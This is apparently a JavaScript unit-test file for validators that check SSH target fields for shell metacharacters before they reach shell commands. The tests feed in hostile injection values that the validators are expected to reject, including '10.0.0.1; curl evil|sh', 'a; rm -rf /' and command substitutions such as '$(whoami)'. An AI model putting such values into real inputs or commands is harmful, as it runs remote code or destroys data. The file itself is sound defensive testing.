'use strict';

// Tests for lib/ssh-target-safety.js (#314) — the shared shape-validators for
// SSH-target fields interpolated into shell commands. Source of truth reused by
// openclaw-detect, openclaw-version, and the /api/openclaw/test route.

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');

const {
  SAFE_HOST, SAFE_USER, SAFE_KEYPATH, unsafeReason,
  unsafeHostReason, isIpLiteralHost, validateFallbackHosts, auditIpLiteralConnections
} = require('../lib/ssh-target-safety');

const GOOD = { host: '192.0.2.10', sshUser: 'deploy-user', sshKeyPath: '~/.ssh/openclaw_key' };

describe('ssh-target-safety (#314)', () => {
  describe('unsafeReason', () => {
    it('accepts a well-formed target', () => {
      assert.equal(unsafeReason(GOOD), null);
    });

    it('accepts IPv4, IPv6, tailscale names, and absolute key paths', () => {
      assert.equal(unsafeReason({ ...GOOD, host: 'fd7a::1' }), null);
      assert.equal(unsafeReason({ ...GOOD, host: 'kobold.tail1234.ts.net' }), null);
      assert.equal(unsafeReason({ ...GOOD, sshKeyPath: '/home/jason/.ssh/id_ed25519' }), null);
    });

    it('requires all three fields', () => {
      assert.match(unsafeReason({ host: 'h', sshUser: 'u' }), /required/);
      assert.match(unsafeReason(null), /required/);
      assert.match(unsafeReason({}), /required/);
    });

    it('rejects shell metacharacters per field', () => {
      assert.match(unsafeReason({ ...GOOD, host: '10.0.0.1; curl evil|sh' }), /host/);
      assert.match(unsafeReason({ ...GOOD, sshUser: 'a$(whoami)' }), /sshUser/);
      assert.match(unsafeReason({ ...GOOD, sshKeyPath: '~/.ssh/k`id`' }), /sshKeyPath/);
      assert.match(unsafeReason({ ...GOOD, host: 'a b' }), /host/);
      assert.match(unsafeReason({ ...GOOD, sshUser: 'u&v' }), /sshUser/);
    });
  });

  describe('unsafeHostReason (#1531)', () => {
    it('accepts a well-formed host, standalone (no sshUser/sshKeyPath needed)', () => {
      assert.equal(unsafeHostReason('habitat.tail123.ts.net'), null);
      assert.equal(unsafeHostReason('192.168.20.10'), null);
      assert.equal(unsafeHostReason('fd7a::1'), null);
    });
    it('rejects missing or unsafe hosts', () => {
      assert.match(unsafeHostReason(''), /required/);
      assert.match(unsafeHostReason(null), /required/);
      assert.match(unsafeHostReason('a; rm -rf /'), /unsafe/);
    });
  });

  describe('isIpLiteralHost (#363)', () => {
    it('recognizes IPv4 dotted-quad literals', () => {
      assert.equal(isIpLiteralHost('192.168.20.10'), true);
      assert.equal(isIpLiteralHost('10.0.0.1'), true);
    });
    it('recognizes bracketed and bare IPv6 literals', () => {
      assert.equal(isIpLiteralHost('[::1]'), true);
      assert.equal(isIpLiteralHost('::1'), true);
      assert.equal(isIpLiteralHost('fd7a::1'), true);
    });
    it('does not flag a DNS/MagicDNS name', () => {
      assert.equal(isIpLiteralHost('habitat.tail123.ts.net'), false);
      assert.equal(isIpLiteralHost('kobold'), false);
    });
    it('is false for non-string/empty input', () => {
      assert.equal(isIpLiteralHost(''), false);
      assert.equal(isIpLiteralHost(null), false);
      assert.equal(isIpLiteralHost(undefined), false);
    });
  });

  describe('validateFallbackHosts (#1531)', () => {
    it('accepts an empty/absent list', () => {
      assert.deepEqual(validateFallbackHosts(undefined), { ok: true, hosts: [] });
      assert.deepEqual(validateFallbackHosts(null), { ok: true, hosts: [] });
      assert.deepEqual(validateFallbackHosts([]), { ok: true, hosts: [] });
    });
    it('refuses a non-array', () => {
      const r = validateFallbackHosts('not-an-array');
      assert.equal(r.ok, false);
      assert.match(r.error, /array/);
    });
    it('refuses a non-string entry', () => {
      const r = validateFallbackHosts([123]);
      assert.equal(r.ok, false);
      assert.match(r.error, /strings/);
    });
    it('trims and drops blank entries, preserving priority order', () => {
      const r = validateFallbackHosts(['  habitat.tail123.ts.net  ', '', '   ', 'kobold']);
      assert.deepEqual(r, { ok: true, hosts: ['habitat.tail123.ts.net', 'kobold'] });
    });
    it('shape-validates every entry the same way unsafeHostReason does', () => {
      const r = validateFallbackHosts(['ok-host', 'a; rm -rf /']);
      assert.equal(r.ok, false);
      assert.match(r.error, /unsafe/);
      assert.match(r.error, /a; rm -rf \//);
    });
    it('dedupes against both the primary host and other fallback entries, keeping the first occurrence', () => {
      const r = validateFallbackHosts(['192.168.20.10', 'habitat.tail123.ts.net', 'habitat.tail123.ts.net'], '192.168.20.10');
      assert.deepEqual(r, { ok: true, hosts: ['habitat.tail123.ts.net'] });
    });
  });

  describe('auditIpLiteralConnections (#363)', () => {
    it('flags only the IP-literal connections, with a suggested action', () => {
      const result = auditIpLiteralConnections([
        { id: '1', name: 'Alpha', host: '192.168.20.10' },
        { id: '2', name: 'Beta', host: 'habitat.tail123.ts.net' }
      ]);
      assert.equal(result.ipLiteralCount, 1);
      assert.equal(result.connections.length, 1);
      assert.equal(result.connections[0].id, '1');
      assert.equal(result.connections[0].isIpLiteral, true);
      assert.ok(result.connections[0].suggestedAction);
    });
    it('reports zero for an empty or all-DNS-named list', () => {
      assert.equal(auditIpLiteralConnections([]).ipLiteralCount, 0);
      assert.equal(auditIpLiteralConnections([{ id: '1', name: 'X', host: 'a.b.c' }]).ipLiteralCount, 0);
    });
  });

  describe('regex allow-lists', () => {
    it('SAFE_HOST allows host/ip shapes, rejects metacharacters', () => {
      for (const ok of ['10.0.0.1', 'fd7a::1', 'host.example.com', 'a-b_c']) assert.ok(SAFE_HOST.test(ok), ok);
      for (const bad of ['a;b', 'a b', 'a|b', 'a$(x)', 'a`x`', '']) assert.ok(!SAFE_HOST.test(bad), bad);
    });
    it('SAFE_USER allows usernames, rejects metacharacters', () => {
      for (const ok of ['admin', 'deploy-user', 'a.b_c']) assert.ok(SAFE_USER.test(ok), ok);
      for (const bad of ['a$(x)', 'a b', 'a;b', '']) assert.ok(!SAFE_USER.test(bad), bad);
    });
    it('SAFE_KEYPATH allows ~ + path bodies, rejects metacharacters', () => {
      for (const ok of ['~/.ssh/id_ed25519', '/home/x/.ssh/k', 'rel/path-1']) assert.ok(SAFE_KEYPATH.test(ok), ok);
      for (const bad of ['~/k`id`', 'a b', 'a;b', '"q"', '']) assert.ok(!SAFE_KEYPATH.test(bad), bad);
    });
  });
});
